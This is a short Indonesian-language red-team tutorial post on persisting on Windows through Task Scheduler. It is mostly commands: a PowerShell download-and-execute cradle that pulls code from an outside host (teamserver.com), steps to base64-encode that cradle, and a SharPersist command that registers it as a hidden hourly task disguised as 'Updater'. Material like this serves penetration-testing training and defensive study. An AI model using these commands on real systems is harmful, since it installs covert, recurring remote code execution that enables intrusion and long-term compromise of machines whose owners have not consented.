---
title: 'Persistence via Task Scheduler'
date: 2023-07-26 09:20:22 +0700
categories: ['Windows Hacking', 'Windows Persistence']
tags: [red team, Persistence, windows hacking, windows Persistence, task scheduler]     # TAG names should always be lowercase
author: nairpaa
---

**Task Scheduler** di Windows memungkinkan kita untuk membuat "*task*" yang dieksekusi berdasarkan pemicu (*trigger*) yang telah ditentukan sebelumnya. 

Pemicu tersebut dapat berupa waktu pada suatu hari, saat pengguna masuk ke sistem (*user-logon*), ketika komputer sedang *idle* (tidak digunakan), ketika komputer terkunci (*locked*), atau kombinasi dari beberapa pemicu tersebut.

## 0x1 - Exploitation Stages

### Step 1: Creating a PowerShell Payload

Di PowerShell:

```powershell
# Menyimpan payload pada variable
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://teamserver.com/a"))'

# Konversi payload ke base64
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```

Di Linux:

```bash
# Menyimpan payload pada variable
➜ set str 'IEX ((new-object net.webclient).downloadstring("http://teamserver.com/a"))'

# Konversi payload ke base64
➜ echo -en $str | iconv -t UTF-16LE | base64 -w 0
```

### Step 2: Add Malicious Task to Task Scheduler

```powershell
PS > .\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <base64_payload>" -n "Updater" -m add -o hourly
```

Keterangan:
- `-t`: Teknik *persistence* yang diinginkan.
- `-c`: Perintah yang akan dieksekusi.
- `-a`: Argumen dari perintahnya.
- `-n`: Nama dari *task*.
- `-m`: Menambahkan *task* (bisa juga untuk `remove`, `check` dan `list`).
- `-o`: Frekuensi *task* dijalankan.

![Task Scheduler](/assets/img/posts/windows-persistence-task-scheduler/1.png)
_Task Scheduler_


---

## 0x2 - References

- https://github.com/mandiant/SharPersist
- https://pentestlab.blog/2019/11/04/persistence-scheduled-tasks/
